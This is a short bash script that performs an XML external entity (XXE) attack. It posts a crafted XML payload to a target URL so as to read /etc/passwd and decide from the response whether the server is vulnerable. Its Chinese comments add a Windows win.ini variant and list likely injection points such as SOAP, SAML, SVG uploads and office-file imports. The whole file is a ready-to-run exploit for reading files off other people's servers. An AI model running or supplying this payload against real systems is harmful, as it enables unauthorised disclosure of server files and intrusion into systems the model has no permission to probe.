#!/usr/bin/env bash
TARGET="${1:?usage: bash xxe.sh http://TARGET/api/xml}"
cat > runs/xxe.xml <<'XML'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<r>&xxe;</r>
XML
curl -sS -m 10 -X POST "$TARGET" -H 'Content-Type: application/xml' --data-binary @runs/xxe.xml -o runs/xxe-resp.txt -w 'http=%{http_code}\n'
head -20 runs/xxe-resp.txt
grep -q 'root:x:0:0' runs/xxe-resp.txt && echo "VULN  $TARGET" || echo "SAFE/未命中（外部实体被禁或输入不是 XML）"
# Windows 目标：file:///c:/windows/win.ini
# 常见投放点（Content-Type 必须是 xml/json 里的 xml 字段）：
#   SOAP（/ws/*）、SAML（/sso）、svg 上传、docx/xlsx 导入、RSS 订阅
# 判定：响应包含 root:x:0:0 或 [fonts]（win.ini）
